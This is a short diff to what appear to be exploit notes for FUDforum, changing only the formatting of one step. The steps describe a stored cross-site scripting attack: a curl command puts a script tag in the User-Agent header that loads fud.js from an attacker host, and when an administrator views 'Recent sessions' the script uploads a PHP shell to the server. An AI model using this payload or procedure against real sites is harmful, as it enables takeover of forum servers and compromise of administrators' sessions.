@@ -24,6 +24,7 @@ Notes:
    This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.
 
 2. Send the XSS payload below (from an IP associated with an account) / host the script:
-curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php
+
+- curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php
 
 3. When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
